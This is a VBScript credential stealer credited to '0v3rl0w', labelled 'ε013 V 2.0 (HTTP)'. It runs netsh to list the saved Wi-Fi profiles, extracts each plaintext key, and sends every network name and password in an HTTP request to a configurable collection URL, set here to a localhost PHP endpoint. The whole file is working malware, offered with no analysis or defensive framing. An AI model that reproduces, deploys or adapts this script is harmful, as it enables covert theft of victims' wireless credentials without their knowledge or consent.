'//////////////////////////////////////////////
'//            ε013 V 2.0 (HTTP)
'//          Jordan Dalcq - 0v3rl0w
'/////////////////////////////////////////////

'///////////////// HOST INFO //////////////////
HOST = "http://localhost:8000/e013-http.php"
'/////////////////////////////////////////////

Function GetOutput(command)
  Set Shell = Wscript.CreateObject("WScript.Shell")
  Set cmd = Shell.Exec("powershell /c  " & command)
  strOut = ""

  Do While Not cmd.StdOut.AtEndOfStream
    strOut = strOut & cmd.StdOut.ReadLine() & "\n"
  Loop
  GetOutput=strOut
End Function

Function sendIt(hostname, wireless, passwd)
  Set request = WScript.CreateObject("WScript.SHell")
  PASS = "[uri]::EscapeDataString('" & passwd & "')"
  WIFI = "[uri]::EscapeDataString('" & wireless & "')"
  URL = HOST & "?cred=" & GetOutput(WIFI) & "," & GetOutput(PASS)
  request.run "cmd.exe /C start " & URL
  WScript.Sleep 1000
End Function

strText=Split(GetOutput("netsh wlan show profile"), "\n")

i = 0

For Each x in strText
	If i > 8 And i < Ubound(strText)-1 Then
		Name = Split(x, ": ")(1)
		str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")
    For Each options in str
      options=Replace(options, " ", "")
      If UBound(Split(options, ":")) >= 1 Then
        If Split(options, ":")(0) = "KeyContent" Then
          passwd = Split(options, ":")(1)
          sendIt HOST, Name, passwd
        End If
      End If
    Next
	End If
	i = i + 1
Next
